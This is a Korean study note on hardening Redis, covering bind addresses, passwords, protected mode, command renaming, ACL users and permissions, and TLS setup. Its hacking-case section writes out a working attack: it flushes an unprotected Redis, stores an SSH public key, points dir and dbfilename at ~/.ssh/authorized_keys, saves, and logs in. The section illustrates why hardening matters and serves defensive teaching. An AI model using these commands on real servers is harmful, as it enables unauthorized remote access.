레디스는 RDB만큼 보안 관리가 필요하다.
레디스를 캐시로 사용한다면 RDB의 데이터를 임시로 저장하는 것이기 때문에 레디스의 보안이 뚫리면 RDB의 데이터에 접근하는 것과 같고
메시징 시스템으로 사용할 경우에도 서비스 데이터의 중간 전달자 역할을 하기 때문에 레디스의 데이터는 보안이 중요하다.

## 커넥션 제어

### bind
레디스 인스턴스가 실행 중인 서버는 여러 개의 네트워크 인터페이스를 가질 수 있다.
이는 서버가 여러 개의 ip를 가지고 있을 수 있다는 것을 의미한다.

bind 설정은 레디스가 서버의 여러 ip 중 어떤 ip를 통해 들어오는 연결을 받아들일 것인지를 지정한다.
![[KakaoTalk_Photo_2025-10-15-14-54-37 001.jpeg|650]]
레디스가 실행되는 서버는 localhost까지 총 5개의 ip를 가지고 있으며 그 중  이더넷1, 로컬만 bind로 설정해서 두 개의 ip만 레디스로 접근이 가능하다.

bind의 기본 값은 127.0.0.1이며 이는 루프백(로컬) IP 주소를 의미한다.
기본 값을 변경하지 않으면 레디스는 오직 동일한 서버 내에서의 연결만 허용하게된다.
외부에서 직접 레디스에 접근해야 하는 경우 이 값을 서버를 바라보는 다른 유효한 IP 주소로 변경해야 한다.

![[KakaoTalk_Photo_2025-10-15-14-54-38 002.jpeg|650]]
그림의 예시를 보면 bind는 2번 ip와 로컬로 설정되어 있다.
이 때 1번 ip로 연결을 시도하면 연결이 되지 않고 2번 ip로 연결을 시도하면 정상적인 연결이 가능하다.

```
bind의 설정 값
127.0.0.1 : 로컬
0.0.0.0 : 모든 연결 허용
* : 모든 연결 허용
```

모든 연결 허용은 사용하지 않는 것이 좋고 특정 ip로 지정해서 사용하는 것이 보안상 좋다.

### 패스워드
레디스에서 패스워드를 설정하는 방법은 총 두 가지이다.
1. 노드에 패스워드 설정
2. ACL(Access Control List) 기능(버전 6 이상)

#### 노드에 패스워드 설정
requirepass를 활용해 레디스 서버에 하나의 패스워드를 설정하는 방식
```
config set requirepass password
```
redis.conf에서 지정한 뒤 실행할 수도 있고 위의 커맨드를 활용해 운영 중 변경하는 것도 가능하다.

redis-cli를 이용해 패스워드가 설정된 노드에 접속하려면 접속시 -a 옵션을 이용하거나
그냥 접속 후 AUTH 커맨드로 패스워드를 입력할 수 있다.

```
redis-cli -a password

127.0.0.1:6379> AUTH password
>> 접속 후 AUTH로 먼저 인증하지 않으면 어떤 커맨드도 사용할 수 없다.
```

### Protected Mode
레디스를 운영 용도로 사용한다면 설정하는 것을 권장
레디스 인스턴스에 패스워드를 설정하지 않았다면 레디스느 로컬에서 들어오는 연결만을 허용
bind로 설정된 다른 네트워크 인터페이스를 통해 들어오는 것도 차단한다.

기본 값은 yes이며 만약 패스워드 없이 사용하고 싶다면 no로 변경해야한다.


## 커맨드 제어
레디스는 명령어를 통해 인스턴스의 중요한 설정값을 제어 할 수 있다.
CONFIG SET을 통해 대부분의 레디스 설정을 변경할 수 있는데 이를 허용되지 않은 클라이언트가 실행하면 레디스의 설정이 변경되는 일이 발생한다.
따라서 레디스의 커맨드를 제어할 필요가 있다.

### 커맨드 이름 변경
rename-command는 레디스에서 특정 커맨드를 다른 이름으로 변경하거나 커맨드를 비활성화 할 수 있는 설정이다.
redis.conf에서 변경할 수 있으며 실행 중에는 동적으로 변경할 수 없다.
```
rename-command CONFIG CONFIG_NEW
>> CONFIG 명령어를 CONFIG_NEW라는 명령어로 변경
>> 이렇게 하면 운영자 외에는 CONFIG_NEW라는 명령어를 알 수 없어 해당 명령어를 사용할 수 없다.
```

만약 센티널을 사용중이라면 sentinel.conf에서도 변경해야한다.
센티널은 장애가 발생했다고 판단하면 레디스에 REPLICAOF, CONFIG 등의 명령어는 날려 레디스 인스턴스를 제어하는데
명령어가 바뀐것을 센티널이 알지 못하면 페일오버가 정상적으로 작동하지 않는다.
```
sentinel.conf

sentinel rename-command CONFIG CONFIG_NEW
```
### 커맨드 실행 환경 제어
레디스 버전 7부터는 보안을 강화하기 위해 특정 커맨드를 실행하는 환경을 제어할 수 있다.
레디스가 실행 중일 때 변경하면 위험할 수 있는 커맨드는 기본적으로 변경할 수 없도록 차단됐으며
사용자는 이러한 커맨드 변경을 아예 차단 또는 허용 하거나 로컬에서만 변경이 가능하도록 선택할 수 있다.
```
enable-protected-config no
>> 레디스의 기본 경로 설정인 dir 및 백업 파일의 경로를 지정하는 dbfile등의 옵션을 CONFIG 커맨드로 수정하는 것을 차단

enable-debug-command no
>>DEBUG 커맨드 차단

enable-moduel-command no
>> MODULE 커맨드를 차단

no : 모든 연결에 대해 수행이 차단
yes : 모든 연결에 대해 수행이 허용
local : 로컬 연결만 수행이 허용
```


### 레디스를 이용한 해킹 사례
![[KakaoTalk_Photo_2025-10-15-16-00-00 001.jpeg|700]]
203.0.113.1이라는 IP 주소를 가진 서버에서 레디스가 실행중이고 레디스의 protected-mode가 no, 패스워드도 설정되지 않았다고 가정
서버 B에서 서버 A의 레디스에 접근이 가능한지 확인하기 위해 talent 커맨드로 확인
연결이 된다면 네트워크 통신이 가능하며 redis-cli를 사용해 패스워드 없이 연결하는 것도 가능하다.

서버 B에서 SSH 키를 생성하고 이 키의 데이터를 레디스를 통해 서버 A로 전송해 파일로 저장한 후 이 키를 사용해 서버 B에서 A로 접근을 가능하게 해보자
![[KakaoTalk_Photo_2025-10-15-16-00-01 002.jpeg|700]]
1. 서버 B에서 ssh-keygen을 이용해 ssh 키를 생성, 파일의 앞 뒤에 공백을 넣어 key.txt라는 텍스트 파일을 생성
2. 서버 B에서 A의 레디스로 접근해서 레디스의 내용을 전체 삭제한 뒤 방금 생성한 텍스트 파일을 데이터로 넣어준다.
```
[centos@serverB ~]$ redis-cli -h 203.0.113.1 echo flushall
[centos@serverB ~]$ cat key.txt | redis-cli -h 203.0.113.1 -x set key
```
3. 서버 A의 레디스에 직접 접근해 데이터가 저장되는 경로와 파일명을 변경
```
[centos@serverB ~]$ redis-cli -h 203-0.113.1 -p 6379
203.0.113.1:6379> CONFIG SET dir /home/centos/.ssh/
OK

203.0.113.1:6379> CONFIG SET dbfilename authorized_keys
OK

203.0.113.1:6379> SAVE
OK
>> dir과 dbfilename의 설정을 변경한 뒤 SAVE를 사용하면 dir 경로에 authrized_keys라는 이름으로 RDB 파일이 저장된다.
```
4. 서버 B에서 생성한 ssh 키를 서버 A에 직접 복사하는 대신 레디스를 이용해 데이터를 간접적으로 전달해 서버 A에 직접적으로 접근할 수 있게 됐다.
```
[centos@serverB ~]$ ssh -i id_rsa centos@203.0.113.1
[centos@serverA ~]$
>> ssh로 서버 A에 직접 접근 가능해짐 
```

이처럼 보안이 취약한 레디스를 이용해 서버에 직접 접근할 수 있게 된다.

따라서 보안을 강화하기 위해 protected-mode 설정, 패스워드 설정 등 보안 관련 설정을 해야한다.

## ACL(Access Control List)
6 이전 버전에서는 레디스에 접근하는 클라이언트의 권한을 제어할 수 없었고 커맨드의 이름만 변경해 위험한 커맨드를 모든 사용자에게 노출시키지 않는 정도였다.
하지만 이 방법은 일시적으로 커맨드를 가려주는 역할이고 변경된 커맨드 이름이 노출되면 무용지물이었다.

그래서 레디스 버전 6부터는 ACL을 통해 유저라는 개념을 도입해 각 유저별로 권한을 달리했다.
![[KakaoTalk_Photo_2025-10-15-16-25-42.jpeg|925]]

### 유저의 생성과 삭제
```
유저의 생성
ACL SETUSER garimoo on >password ~cached:* &* +@all -@dangerous
OK
>> 생성 뿐만 아니라 수정시에도 사용된다.
ex)
ACL SETUSER garimoo ~id:*
>> cached: 키만 조회가 가능했었는데 id: 키도 조회가 가능하게 수정

유저 확인
ACL getuser garimoo
1) "flags"
2) 1) "on"
...

유저의 삭제
ACL DELUSER garimoo
(integer) 1

레디스 생성된 모든 유저 확인
ACL LIST
1) "user default(유저이름) on(활성상태) nopass(패스워드 없음) ~*(모든키 접근 가능) &*(전체 체널 접근 가능) +@all(전체 커맨드 사용가능)"
>> 생성된 유저가 없을 시에는 기본 유저가 조회
```

### 유저 상태 제어
유저의 활성 상태는 on과 off로 제어할 수 있다.
on일 경우 해당 유저로의 접근을 허용함을 의미한다.

활성 상태였던 유저의 상태를 off로 변경하면 더 이상 접근을 할 수 없지만 이미 접속해 있다면 연결은 여전히 유지된다.

### 패스워드
```
>패스워드 : 패스워드 지정
<패스워드 : 패스워드 삭제
```
기본적으로 패스워드를 지정하지 않으면 유저에 접근할 수 없으나 nopass 권한을 부여하면 패스워드 없이 접근할 수 있다.
또한 nopass를 설정하면 기존에 부여되었던 패스워드는 모두 삭제된다.

repass 권한을 부여하면 유저에 저장된 모든 패스워드가 삭제되며 이때 nopass 상태도 없어진다.
즉 유저에 대해 repass를 사용하면 추가로 패스워드나 nopass를 부여하기 전까지는 그 유저에 접근할 수 없다.

### 패스워드 저장 방식
ACL을 사용하지 않고 기존의 requirepass를 이용해 인스턴스의 패스워드를 정의했을 때는 암호화되지 않은 채로 저장되어 보안 문제가 있었다.

하지만 ACL을 이용해 패스워드를 저장하면 내부적으로 SHA256 방식으로 암호화돼 저장되기 때문에 패스워드를 바로 조회할 수 없다.

다른 사용자가 레디스의 패스워드를 예측할 수 없도록 복잡한 패스워드를 사용하는 것이 좋다.
ACL GENPASS 커맨드를 사용하면 난수를 생성할 수 있다.

### 커맨드 권한 제어
ACL 기능을 이용해 유저가 사용할 수 있는 커맨드를 제어할 수 있다.
운영의 편의성을 위해 일부 커맨드는 그룹화돼 카테고리로 정리돼 있기 때문에 운영자는 커맨드를 일일이 직접 제어할 필요가 없다.

+@all 또는 allcommands 키워드는 모든 커맨드의 수행 권한을 부여한다는 것을 의미하며
-@all 또는 nocommands는 아무런 커맨드를 사용할 수 없다는 것을 뜻한다.
유저 생성시 기본 값은 -@all이며 +@all을 언급해야 커맨드 수행 권한을 부여 받는다.

```
+@<category> : 특정 카테고리 권한 추가
-@<category> : 특정 카테고리 제외
+<command> : 개별 커맨드 추가
-<command> : 개별 커맨드 제외

ACL CAT : 레디스에 미리 정의돼 있는 카테고리의 커맨드 리스트를 확인

ex)
ACL CAT
1) "keyspace"
2) "read"
....

각 카테고리에 포함된 상세 커맨드를 확인하려면 ACL CAT <category>로 확인할 수 있다.
```

주목해야 할 카테고리와 포함된 커맨드를 알아보자
#### dangerous 카테고리
아무나 사용하면 위험할 수 있는 커맨드가 포함
레디스 구성을 변경하거나 한번 수행하면 오래 걸려 장애를 유발할 수 있는 커맨드들이다.

**구성 변경 커맨드**
1. replconf
2. replicaof
3. migrate
4. failover

**장애 유발 커맨드**
1. sort
2. flushdb
3. flushall
4. keys

**운영 커맨드**
1. shutdown
2. monitor
3. info
4. debug
5. config
등등 여러 운영 커맨드가 존재

#### admin 카테고리
dangerous 카테고리에서 장애 유발 커맨드를 제외한 커맨드가 들어가 있다.
#### fast 카테고리
O(1)로 수행되는 커맨드를 모아 놓은 카테고리
get, spot, hset 등의 커맨드가 포함
#### slow 카테고리
fast에 속하지 않은 커맨드
scan, set, setbit, sunion 등
#### keysapace 카테고리
키와 관련된 커맨드가 포함된 카테고리
scan, keys, rename, type, expire 등 키의 종류를 파악하거나 TTL을 확인하는 커맨드
#### read 카테고리
데이터를 읽어오는 커맨드가 포함된 카테고리
get, hget, xtrange 등
#### write
데이터를 쓰는 커맨드가 포함된 카테고리
set, lset, setbit, hset 등

### 키 접근 제어
유저가 접근할 수 있는 키도 제어할 수 있다.
레디스는 프리픽스를 사용해 키를 생성하는 것이 일반적이며 프리픽스 규칙을 미리 정해뒀다면 특정한 프리픽스를 가지고 있는 키에만 접근할 수 있도록 제어한다.
```
프리픽스(prefix) : 접두사라는 뜻으로 레디스에서는 키 이름 맨 앞에 붙이는 구분용 단어
ex)
user123 >> user:123(user가 프리픽스)


~* 또는 allkeys 키워드는 모든 키에 대해 접근이 가능하며 ~<pattern>을 이용해 접근 가능한 키를 설정할 수 있다.
ex)
~mail:* >> mail:로 시작하는 모든 키에 대해 접근 가능
```

버전 7 부터는 키에 대한 읽기, 쓰기 권한을 나눠서 부여할 수 있다.
```
%R~<pattern> : 키에 대한 읽기 권한
%W~<pattern> : 키에 대한 쓰기 권한

ex)
ACL SETUSER loguser ~log:* %R~mail:* %R~sms:*
>> loguser라는 유저에게 log:로 시작 하는 모든 접근 권한, mail:/sms:로 시작하는 키에 대해 읽기 권한을 부여


resetkeys 커맨드를 사용하면 유저가 가지고 있는 키에 대한 접근 권한을 모두 초기화
```

### 셀렉터
셀렉터는 버전 7에서 추가된 개념으로 좀 더 유연한 ACL 규칙을 위해 도입
```
ACL SETUSER loguser ~log:* %R~mail:* %R~sms:*
해당 예시에서 loguser는 mail:* 프리픽스 키에 대한 메타데이터도 가지고 올 수 있다.
ex)
TTL mail:1
(integer) 95
>> 만료 시간 같은 메타데이터 확인 가능
```

하지만 다른 읽기 커맨드가 아닌 오직 GET만 사용할 수 있도록 하는것이 셀렉터이다.
```
ACL SETUSER loguser resetkeys ~log:* (+GET ~mail:*)
>> loguser에 정의된 모든 키를 리셋하고 log: 프리픽스에 대한 모든 접근 권한 부여, mail:에 대해서는 GET만 가능하도록 설정
>> 셀렉터를 이용해 오직 GET만 사용 가능하도록 설정한다.
```

### pub/sub 채널 접근 제어
&pattern 키워드로 pub/sub 채널에 접근할 수 있는 권한을 제어할 수 있다.
```
allchannels 또는 &* : 전체 pub/sub 채널 접근 권한 부여
resetchannels : 어떤 채널에도 발행 또는 구독할 수 없음을 의미
```

### 유저 초기화
reset 커맨드를 이용해 유저에 대한 모든 권한을 회수하고 기본 상태로 변경
resetpass, resetkeys, resetchannels, off, -@all 상태로 변경돼 ACL SETUSER를 한 직후와 동일해진다.

### ACL 규칙 파일로 관리하기
ACL 규칙은 파일로 관리할 수 있으며 기본적으로 redis.conf에 저장되며 ACL 파일만 따로 관리해 유저 정보만 저장하는 것도 가능하다.
```
aclfile /etc/redis/users.acl
>> 해당 디렉토리에 users.acl 파일로 저장됨
```
저장되는 형태는 동일하며 저장되는 위치만 달라진다.

ACL 파일을 사용하지 않을 때에는 CONFIG REWRITE 커맨드를 이용해 레디스의 모든 설정값과 ACL 룰을 한 번에 redis.conf에 저장할 수 있다.

ACL 파일을 따로 관리할 경우 ACL LOAD나 ACL SAVE 커맨드를 이용해 유저 데이터를 레디스로 로드하거나 저장하는것이 가능하다.

## SSL/TLS
레디스 버전 6부터 SSL/TLS 프로토콜을 이용한 보안 연결을 지원한다.

### SSL/TLS 란?
SSL(Secure Sockets Layer)는 암호화를 위한 인터넷 기반 보안 프로토콜로 TLS(Transport Layer Security)의 전신이다.
(SSL이 발전한 형태가 TLS, 현재는 TLS가 많이 쓰인다.)

SSL/TLS 프로토콜은 데이터 전송 과정에서 정보를 암호화함으로써 중간에서 데이터가 노출되거나 조작되는것을 방지한다.
[[암호화 프로토콜]]  참고

레디스는 네트워크를 통해 클라이언트와 서버 간에 데이터를 빠르게 주고받는다.
이 과정에서 민감한 정보나 중요한 데이터가 평문 형태로 전송되면 악의적인 공격자에 의해 탈취되거나 조작될 위험이 있다.
SSL/TLS 프로토콜을 적용함으로써 데이터 전송 과정을 암호화하면 이러한 보안 위험을 크게 감소 시킬 수 있다.

특히 클라우드 환경이나 원격 지점에서 레디스 서버에 접근해야 하는 상황에서 SSL/TLS 통신은 데이터의 안전한 전송을 보장하고
기업의 보안 정책을 준수하고 규제 요구사항을 만족하는 데 필수적이다.

### 레디스에서 SSL/TLS 사용하기
기본적으로 레디스에서 SSL/TLS는 비활성화돼 있다.
암호화 프로토콜을 사용하려면 레디스를 처음 빌드할 때부터 다음과 같이 정의해야 한다.
```
make BUIL_TLS=yes
```

레디스에서 암호화 프로토콜을 사용할 때 레디스 인스턴스와 클라이언트 간 동일한 인증서를 사용한다.
따라서 key, cert, ca-cert 파일은 레디스를 실행할 클라이언트에 동일하게 복사해둬야 한다.
```
redis.conf 설정
tls-port <포트 번호>
tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```

기본 설정인 port와 tls-port 모두 지정했다면 레디스 인스턴스는 두 가지의 설정을 모두 받아들일 수 있다.
일반 통신은 port에서 지정한 포트 번호로, 인증서를 기반으로한 암호화 프로토콜의 접근은 tls-port로 접근할 수 있다.

redis-cli를 이용해 암호화 프로토콜을 활성화한 인스턴스에 접속할 때에는 연결시 인증서를 입력해야 한다.
```
./src/redis-cli --tls \
	--cert /path/to/redis.crt \
	--key /path/to/redis.key \
	--cacert /path/to/ca.crt \
>> redis.conf에서 등록한 파일과 동일해야함
```

### SSL/TLS를 사용한 HA 구성

#### 복제 구성
SSL/TLS를 사용하는 마스터와 TLS 연결을 이용한 복제를 하기 위해서는 복제본도 마스터와 동일하게 설정을 추가해야 한다.
```
tls-port <포트 번호>
tls-replication yes
tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```
기본적으로 tls-replication은 no로 설정돼 있는데 이는 복제본에서 마스터로의 커넥션이 일반 프로토콜로 연결됨을 의미

복제본-마스터 연결도 암호화로 하려면 해당 설정을 yes로 해야한다.

#### 센티널 / 클러스터 구성
센티널, 클러스터도 SSL/TLS 연결을 사용할 수 있다.
```
sentinel.conf 설정
tls-port <포트 번호>
tls-replication yes
tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt

클러스터 설정
tls-port <포트 번호>
tls-replication yes
tls-cluster yes >> 추가
tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```
해당 설정들을 통해 센티널과 클러스터에서도 SSL/TLS 프로토콜을 사용할 수 있다.